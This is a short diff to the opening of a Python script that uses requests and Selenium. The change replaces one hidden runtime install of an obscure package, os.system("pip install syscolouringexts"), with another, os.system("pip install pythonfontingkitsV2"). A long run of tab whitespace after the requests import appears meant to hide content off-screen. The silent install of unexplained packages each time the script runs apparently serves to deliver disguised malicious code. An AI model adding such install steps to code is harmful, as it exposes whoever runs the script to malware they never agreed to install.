@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringexts")
-import syscolouringexts
+os.system("pip install pythonfontingkitsV2")
+import pythonfontingkitsV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
